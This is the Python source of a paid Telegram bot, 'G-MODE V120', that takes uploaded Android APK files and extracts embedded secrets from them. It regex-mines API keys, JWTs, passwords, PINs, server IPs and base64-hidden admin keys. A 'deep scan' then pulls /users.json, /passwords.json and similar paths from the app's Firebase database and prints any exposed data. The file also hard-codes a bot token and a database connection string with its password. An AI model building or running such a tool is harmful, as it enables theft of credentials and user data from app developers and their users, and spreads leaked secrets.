import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
import re
import hashlib
import json
import base64
import string
import random
from flask import Flask
from threading import Thread
import concurrent.futures
import os
import zipfile
import io
import psycopg2
from psycopg2 import pool
import time

# 🌐 --- RENDER KEEP-ALIVE SERVER ---
app = Flask(__name__)

@app.route('/')
def home():
    return "G-MODE V120 ENGINE: STATUS ONLINE"

def run_server():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

def start_keep_alive():
    t = Thread(target=run_server)
    t.daemon = True
    t.start()

# ⚙️ --- CORE CONFIG --- ⚙️
TOKEN = "8876139863:AAEI29jQt7OYm9CHmi0NQp-YNtgVdn4NRmM"
ADMIN_ID = 7387429271       
SUPPORT_BOT = "https://t.me/Aaryansupportby_bot"

# 🗄️ --- SUPABASE CLOUD DATABASE CONFIG --- 🗄️
DB_URI = "postgresql://postgres.fwctqqzsytswydguiuzg:vDeortGQ$h1DBJuQgB4&@aws-1-ap-south-1.pooler.supabase.com:6543/postgres"

bot = telebot.TeleBot(TOKEN)
recon_session = requests.Session()

# 🩸 --- SURGICAL REGEX MATRIX --- 🩸
FB_URL = re.compile(rb"https://([a-zA-Z0-9-]+)\.(?:firebaseio\.com|firebasedatabase\.app)")
FB_STORAGE = re.compile(rb"([a-zA-Z0-9-]+)\.(?:appspot\.com|firebasestorage\.app)")
API_KEY = re.compile(rb"AIza[0-9A-Za-z-_]{35}")
SIX_DIGIT_PIN = re.compile(rb"\b\d{6}\b")
JWT_TOKEN = re.compile(rb"eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}")
UUID_PATTERN = re.compile(rb"(?i)[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}")
EXPLICIT_CREDS = re.compile(rb"(?:password|passwd|pwd|pass|admin|secret|key|token|sandi|senha|clave|apikey|api_key|access_token|auth_token|bearer|db_pass|dbpass)[\"'\s:=]+([a-zA-Z0-9@*#_!$-]{5,64})", re.IGNORECASE)
URI_CREDS = re.compile(rb"(?:https?|ftp|tcp)://([a-zA-Z0-9_-]+):([a-zA-Z0-9_@*#!$-]+)@")

# 💎 --- ELITE EXTRACTION PATTERNS --- 💎
UNIVERSAL_URL = re.compile(rb"https?://[a-zA-Z0-9./_?&=-]+")
IPV4_PATTERN = re.compile(rb"\b(?:\d{1,3}\.){3}\d{1,3}\b")
ASSIGNMENT_PATTERN = re.compile(rb"(?:password|passwd|pwd|master_key|bypass_token|auth_key|admin_key|secret_key|admin_pass|root_password|is_debug|bypass_auth|emergency_bypass)[\"'\s:=]+([a-zA-Z0-9@*#_!$-]{4,64})", re.IGNORECASE)

# 🧠 --- STATE MEMORY ---
FILE_CACHE = {}
SCAN_COUNTER = 0

# 🧠 --- PERSISTENT DATABASE POOLING --- 🧠
db_pool = None

def init_pool():
    global db_pool
    try:
        db_pool = pool.SimpleConnectionPool(1, 20, DB_URI)
    except Exception as e:
        print(f"Failed to create connection pool: {e}")

def check_user(user_id, username):
    if user_id == ADMIN_ID:
        return True

    global db_pool
    if db_pool is None:
        print("⚠️ Database pool is None! Initialization failed earlier.")
        return False

    conn = None
    try:
        conn = db_pool.getconn()
        c = conn.cursor()
        c.execute("SELECT subscription_expiry FROM users WHERE user_id = %s", (user_id,))
        user = c.fetchone()
        if not user:
            c.execute("INSERT INTO users (user_id, username, first_seen) VALUES (%s, %s, %s)", (user_id, username, time.time()))
            conn.commit()
            expiry = 0
        else:
            expiry = user[0]
        return expiry > time.time()
    except Exception as e:
        print(f"DB Auth Error: {e}")
        return False
    finally:
        if db_pool and conn:
            db_pool.putconn(conn)

# 🛡️ --- PAYWALL / UI MENUS --- 🛡️
def paywall_markup():
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("💳 ACQUIRE ELITE CLEARANCE", url=SUPPORT_BOT),
        InlineKeyboardButton("🔓 REDEEM ACCESS KEY", callback_data="enter_key"),
        InlineKeyboardButton("🛠️ CONTACT SUPPORT", url=SUPPORT_BOT)
    )
    return markup

def premium_main_menu():
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("🛠️ CONTACT SUPPORT", url=SUPPORT_BOT)
    )
    return markup

# 👑 --- ADMIN DASHBOARD --- 👑
@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID: return
    
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🔑 GENERATE KEY", callback_data="admin_gen_key"),
        InlineKeyboardButton("📊 SYSTEM STATS", callback_data="admin_stats")
    )
    markup.add(
        InlineKeyboardButton("📢 BROADCAST", callback_data="admin_broadcast")
    )
    bot.reply_to(message, "👑 <b>[ ROOT ADMIN TERMINAL ]</b>\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰\nSelect a directive below:", parse_mode="HTML", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_'))
def admin_callbacks(call):
    if call.from_user.id != ADMIN_ID: return
    bot.answer_callback_query(call.id)
    
    if call.data == "admin_stats":
        conn = db_pool.getconn()
        try:
            c = conn.cursor()
            c.execute("SELECT COUNT(*) FROM users")
            total_users = c.fetchone()[0]
            c.execute("SELECT COUNT(*) FROM users WHERE subscription_expiry > %s", (time.time(),))
            premium_users = c.fetchone()[0]
            bot.send_message(ADMIN_ID, f"📊 <b>[ SYSTEM METRICS ]</b>\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n👥 <b>Total Nodes (Users):</b> {total_users}\n💎 <b>Elite Operatives:</b> {premium_users}", parse_mode="HTML")
        finally:
            db_pool.putconn(conn)
            
    elif call.data == "admin_gen_key":
        msg = bot.send_message(ADMIN_ID, "⏳ <b>Enter duration in days</b> (e.g., 30):", parse_mode="HTML")
        bot.register_next_step_handler(msg, process_key_generation)
        
    elif call.data == "admin_broadcast":
        msg = bot.send_message(ADMIN_ID, "📢 <b>Enter broadcast payload:</b>", parse_mode="HTML")
        bot.register_next_step_handler(msg, process_broadcast)

def process_key_generation(message):
    try:
        days = int(message.text.strip())
        key_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
        conn = db_pool.getconn()
        try:
            c = conn.cursor()
            c.execute("INSERT INTO keys (key_code, duration_days) VALUES (%s, %s)", (key_code, days))
            conn.commit()
            bot.reply_to(message, f"✅ <b>ACCESS KEY FORGED</b>\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n🔑 <b>Key:</b> <code>{key_code}</code>\n⏳ <b>Duration:</b> {days} Days", parse_mode="HTML")
        finally:
            db_pool.putconn(conn)
    except ValueError: 
        bot.reply_to(message, "❌ <b>Syntax Error:</b> Invalid number format.", parse_mode="HTML")

def process_broadcast(message):
    conn = db_pool.getconn()
    try:
        c = conn.cursor()
        c.execute("SELECT user_id FROM users")
        users = c.fetchall()
        success = 0
        for u in users:
            try:
                bot.send_message(u[0], f"📢 <b>[ SYSTEM OVERRIDE / BROADCAST ]</b>\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n\n{message.text}", parse_mode="HTML")
                success += 1
            except: pass
        bot.reply_to(message, f"✅ <b>TRANSMISSION COMPLETE</b>\nPayload delivered to {success}/{len(users)} nodes.", parse_mode="HTML")
    finally:
        db_pool.putconn(conn)

# 🔑 --- USER KEY REDEMPTION --- 🔑
@bot.callback_query_handler(func=lambda call: call.data == "enter_key")
def enter_key_prompt(call):
    bot.answer_callback_query(call.id)
    msg = bot.send_message(call.from_user.id, "🔐 <b>[ SECURE TERMINAL ]</b>\nEnter your 6-digit Elite Access Key:", parse_mode="HTML")
    bot.register_next_step_handler(msg, process_key_redemption)

def process_key_redemption(message):
    key_input = message.text.strip().upper()
    user_id = message.from_user.id
    conn = db_pool.getconn()
    try:
        c = conn.cursor()
        c.execute("SELECT duration_days, is_used FROM keys WHERE key_code = %s", (key_input,))
        key_data = c.fetchone()
        
        if not key_data: 
            bot.reply_to(message, "❌ <b>[ AUTH FAILURE ]</b>\nInvalid or malformed key sequence.", parse_mode="HTML", reply_markup=paywall_markup())
        elif key_data[1] == 1: 
            bot.reply_to(message, "⚠️ <b>[ ACCESS DENIED ]</b>\nThis key has already been consumed by another operative.", parse_mode="HTML", reply_markup=paywall_markup())
        else:
            c.execute("SELECT subscription_expiry FROM users WHERE user_id = %s", (user_id,))
            user_row = c.fetchone()
            current_expiry = user_row[0] if user_row else 0
            
            new_expiry = max(current_expiry, time.time()) + (key_data[0] * 86400)
            c.execute("UPDATE users SET subscription_expiry=%s, active_key=%s WHERE user_id=%s", (new_expiry, key_input, user_id))
            c.execute("UPDATE keys SET is_used=1, redeemed_by=%s WHERE key_code=%s", (user_id, key_input))
            conn.commit()
            bot.reply_to(message, f"🎉 <b>[ ELITE CLEARANCE GRANTED ]</b>\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰\nAuthentication successful. <b>{key_data[0]} Days</b> of Unlimited Extraction added to your account.\n\n📥 You may now drop <code>.apk</code> payloads.", parse_mode="HTML")
    finally:
        db_pool.putconn(conn)

# 🚀 --- SCANNING ENGINE --- 🚀
@bot.message_handler(commands=['start', 'help'])
def start_sequence(message):
    is_premium = check_user(message.from_user.id, message.from_user.username)
    if is_premium: 
        text = (
            "<b>[ ☠️ G-MODE ENGINE : ONLINE ]</b>\n"
            "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n\n"
            "<b>STATUS:</b> <code>AWAITING PAYLOAD</code>\n"
            "<b>CLEARANCE:</b> <code>ELITE</code>\n\n"
            "📥 <b>DIRECTIVE:</b> Drop or forward any <code>.apk</code> file into the terminal to begin surgical extraction."
        )
        bot.reply_to(message, text, parse_mode="HTML", reply_markup=premium_main_menu())
    else: 
        text = (
            "<b>[ 🔒 ACCESS DENIED ]</b>\n"
            "▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n\n"
            "<b>STATUS:</b> <code>CIVILIAN MODE</code>\n"
            "<b>ERROR:</b> Insufficient Clearance.\n\n"
            "To utilize the <b>Ultimate Extraction Engine</b> and uncover hidden Custom Web Panels, Server IPs, and Admin Keys, you must elevate your clearance.\n\n"
            "<i>Select an option below to proceed.</i>"
        )
        bot.reply_to(message, text, parse_mode="HTML", reply_markup=paywall_markup())

@bot.message_handler(content_types=['document'])
def handle_apk(message):
    global SCAN_COUNTER
    user_id = message.from_user.id
    if not check_user(user_id, message.from_user.username):
        text = "🚫 <b>[ PROTOCOL REJECTED ]</b>\nYou do not have the required clearance to execute payloads. Purchase a key to unlock the engine."
        bot.reply_to(message, text, parse_mode="HTML", reply_markup=paywall_markup())
        return

    if not message.document.file_name.lower().endswith('.apk'):
        bot.reply_to(message, "❌ <b>[ SYNTAX ERROR ]</b>\nFormat unsupported. Source must be a valid <code>.apk</code> binary.", parse_mode="HTML")
        return

    status = bot.reply_to(message, "⚙️ <b>[ INITIALIZING SECURE ENVIRONMENT ]</b>\n▱▱▱▱▱▱▱▱▱▱ 0%", parse_mode="HTML")
    try:
        Thread(target=process_apk_task, args=(message, status, user_id)).start()
    except Exception as e:
        bot.edit_message_text(f"❌ <b>CRITICAL CRASH:</b> <code>{e}</code>", message.chat.id, status.message_id, parse_mode="HTML")


def process_apk_task(message, status, user_id):
    global SCAN_COUNTER
    try:
        bot.edit_message_text("📥 <b>[ DOWNLOADING PAYLOAD ]</b>\n▰▰▰▱▱▱▱▱▱▱ 30%", message.chat.id, status.message_id, parse_mode="HTML")
        file_info = bot.get_file(message.document.file_id)
        data = bot.download_file(file_info.file_path)
        sha256_hash = hashlib.sha256(data).hexdigest()
        
        bot.edit_message_text("🔓 <b>[ DECOMPILING BINARY STRUCTURE ]</b>\n▰▰▰▰▰▰▱▱▱▱ 65%", message.chat.id, status.message_id, parse_mode="HTML")
        
        target_data = bytearray(data)
        try:
            with zipfile.ZipFile(io.BytesIO(data)) as apk_zip:
                for file_item in apk_zip.infolist():
                    name = file_item.filename
                    if name.endswith(('.dex', '.json', '.xml', '.properties', '.smali')):
                        if any(sys_lib in name for sys_lib in ['androidx/', 'kotlin/', 'google/']): continue
                        try: target_data.extend(apk_zip.read(name) + b"\n")
                        except: pass
        except zipfile.BadZipFile: pass 

        bot.edit_message_text("🕷️ <b>[ EXECUTING DEEP MATRIX SCAN ]</b>\n▰▰▰▰▰▰▰▰▰▱ 90%", message.chat.id, status.message_id, parse_mode="HTML")
        
        # Base Regex Execution
        url_matches = set(FB_URL.findall(target_data))
        keys = set(API_KEY.findall(target_data))
        jwts = set(JWT_TOKEN.findall(target_data))
        hidden_pins = set(SIX_DIGIT_PIN.findall(target_data))
        explicit_creds = set(EXPLICIT_CREDS.findall(target_data))
        uri_creds = set(URI_CREDS.findall(target_data))

        # Elite Extraction Patterns
        all_urls = set(UNIVERSAL_URL.findall(target_data))
        all_ips = set(IPV4_PATTERN.findall(target_data))
        assignments = set(ASSIGNMENT_PATTERN.findall(target_data))

        custom_urls = list(set([u.decode(errors='ignore') for u in all_urls if b'firebase' not in u and b'google' not in u and b'android' not in u and b'w3.org' not in u]))
        custom_ips = list(set([ip.decode(errors='ignore') for ip in all_ips if ip != b'10.0.2.2' and ip != b'127.0.0.1']))
        custom_keys = list(set([k.decode(errors='ignore') for k in assignments]))

        # Base64 Decoded Secrets Hunt
        decoded_keys = set()
        b64_pattern = re.compile(rb"[a-zA-Z0-9+/]{20,}={0,2}") 
        for item in b64_pattern.findall(target_data):
            try:
                decoded = base64.b64decode(item)
                dec_assign = ASSIGNMENT_PATTERN.findall(decoded)
                if dec_assign:
                    for d in dec_assign: decoded_keys.add(d.decode(errors='ignore'))
            except: continue
        decoded_keys = list(decoded_keys)

        # Filter and Clean Extracted Passwords
        sniffed_passwords = set()
        for cred in explicit_creds: sniffed_passwords.add(cred.decode(errors='ignore'))
        for _, u_pass in uri_creds: sniffed_passwords.add(u_pass.decode(errors='ignore'))

        valid_pins = [p.decode() for p in hidden_pins if p.decode() not in ['000000', '123456', '999999']]
        final_secrets = [s for s in sniffed_passwords if s.lower() not in ['true', 'false', 'null', 'password', 'admin', 'undefined'] and len(s) > 3]
        projects_found = [match.decode() for match in url_matches]

        # Update Cache for Deep Scan
        SCAN_COUNTER += 1
        FILE_CACHE[SCAN_COUNTER] = {"projects": projects_found}

        # Build Clean Report
        report = (
            "<b>[🔥] SURGICAL RECON COMPLETE</b>\n"
            "—·—·—·—·—·—·—·—·—·—·—·—·—·—·—\n"
            f"📂 <b>FILE:</b> <code>{message.document.file_name}</code>\n"
            f"🧬 <b>HASH:</b> <code>{sha256_hash[:16]}...</code>\n\n"
            "<b>[ 🌐 NETWORK / FIREBASE C2 ]</b>\n"
        )
        if projects_found:
            for proj in projects_found: report += f"► <code>https://{proj}.firebaseio.com</code>\n"
        else: report += "► <i>No Firebase C2 detected.</i>\n"

        report += "\n<b>[ 🔑 TOKENS & HASHES ]</b>\n"
        if keys: report += f"► <b>API:</b> <code>{list(keys)[0].decode()}</code>\n"
        if jwts: report += f"► <b>JWT:</b> <code>{list(jwts)[0].decode()[:20]}...</code>\n"
        if not keys and not jwts: report += "► <i>No API/JWT keys found.</i>\n"

        report += "\n<b>[ 🔓 EXTRACTED PASSWORDS & PINS ]</b>\n"
        if valid_pins: report += f"► <b>6-DIGIT:</b> <code>{', '.join(list(valid_pins)[:8])}</code>\n"
        if final_secrets:
            top_secrets = sorted(list(final_secrets), key=len, reverse=True)
            escaped_secrets = [f"<code>{s.replace('<', '&lt;')}</code>" for s in top_secrets[:10]]
            report += f"► <b>CREDS:</b> {', '.join(escaped_secrets)}\n"
        if not valid_pins and not final_secrets:
            report += "► <i>No explicit credentials extracted.</i>\n"

        # 💎 --- THE ELITE EXTRACTION MODULE --- 💎
        report += "\n<b>[ 💎 ELITE EXTRACTION MODULE ]</b>\n"
        if custom_urls: report += f"► <b>Custom Panels:</b> <code>{', '.join(custom_urls[:5])}</code>\n"
        if custom_ips: report += f"► <b>Server IPs:</b> <code>{', '.join(custom_ips[:5])}</code>\n"
        if custom_keys: report += f"► <b>Admin Keys:</b> <code>{', '.join(custom_keys[:8])}</code>\n"
        if decoded_keys: report += f"► <b>Decoded B64:</b> <code>{', '.join(decoded_keys[:5])}</code>\n"
        if not any([custom_urls, custom_ips, custom_keys, decoded_keys]): report += "► <i>No custom Elite structures detected.</i>\n"
            
        report += "—·—·—·—·—·—·—·—·—·—·—·—·—·—·—"

        markup = InlineKeyboardMarkup()
        if projects_found:
            markup.add(InlineKeyboardButton("🟩 INITIATE DEEP SCAN MATRIX", callback_data=f"dp|{SCAN_COUNTER}"))
        markup.add(InlineKeyboardButton("🛠️ CONTACT SUPPORT", url=SUPPORT_BOT))

        bot.edit_message_text(report, message.chat.id, status.message_id, parse_mode="HTML", reply_markup=markup)
        
        # Track DB Scans
        conn = db_pool.getconn()
        try:
            c = conn.cursor()
            c.execute("UPDATE users SET total_scans = total_scans + 1 WHERE user_id = %s", (user_id,))
            conn.commit()
        finally:
            db_pool.putconn(conn)

    except Exception as e:
        bot.edit_message_text(f"❌ <b>CRASH:</b> <code>{e}</code>", message.chat.id, status.message_id, parse_mode="HTML")

# 🌐 --- FIREBASE DEEP SCANNER --- 🌐
def format_json(data):
    import json
    dump = json.dumps(data, indent=2).replace("<", "&lt;").replace(">", "&gt;")
    return dump[:800] + "\n\n... [TRUNCATED] ..." if len(dump) > 800 else dump

def fetch_node(url, path):
    target_url = f"{url}{path}"
    try:
        r = recon_session.get(target_url, timeout=5)
        if r.status_code == 200 and r.json() is not None:
            return path, target_url, "EXPOSED", r.json()
        elif r.status_code in [401, 403]:
            return path, target_url, "SECURED", None
    except: pass
    return path, target_url, "DEAD", None

@bot.callback_query_handler(func=lambda call: call.data.startswith('dp|'))
def run_deep_scan(call):
    bot.answer_callback_query(call.id, "Probing Database Matrix...")
    scan_id = int(call.data.split('|')[1])
    
    if scan_id not in FILE_CACHE or not FILE_CACHE[scan_id]['projects']:
        bot.answer_callback_query(call.id, "❌ Session expired or invalid.", show_alert=True)
        return

    proj_id = FILE_CACHE[scan_id]['projects'][0]
    url = f"https://{proj_id}.firebaseio.com"
    bot.edit_message_text(f"⏳ <b>[📡] PROBING NETWORK NODES...</b>\nExecuting Deep Scan on: <code>{url}</code>", call.message.chat.id, call.message.message_id, parse_mode="HTML")
    
    def execute_scan():
        test_paths = ["/.json", "/users.json", "/admin.json", "/passwords.json", "/Master.json"]
        scan_result = f"<b>[☢️] DEEP MATRIX DATABASE REPORT</b>\n🎯 <b>TARGET:</b> <code>{proj_id}</code>\n\n"
        exposed_count = 0
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            future_to_path = {executor.submit(fetch_node, url, path): path for path in test_paths}
            for future in concurrent.futures.as_completed(future_to_path):
                path, target_url, status, payload = future.result()
                if status == "EXPOSED":
                    exposed_count += 1
                    scan_result += f"🚨 <b>EXPOSED:</b> <code>{path}</code>\n📄 <b>DATA:</b>\n<pre><code>{format_json(payload)}</code></pre>\n"
                elif status == "SECURED":
                    scan_result += f"🔒 <b>SECURED:</b> <code>{path}</code>\n"
                    
        if exposed_count == 0: scan_result += "👻 <i>All tested nodes returned empty or secured.</i>\n"
        
        scan_result += "—·—·—·—·—·—·—·—·—·—·—·—·—·—·—"
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🛠️ CONTACT SUPPORT", url=SUPPORT_BOT))
        bot.edit_message_text(scan_result, call.message.chat.id, call.message.message_id, parse_mode="HTML", reply_markup=markup)
        
    Thread(target=execute_scan, daemon=True).start()

if __name__ == "__main__":
    init_pool()
    start_keep_alive()
    print("☠️ G-MODE V120 ONLINE: SUPABASE CLOUD DEPLOYMENT READY")
    bot.infinity_polling(timeout=20, long_polling_timeout=15)
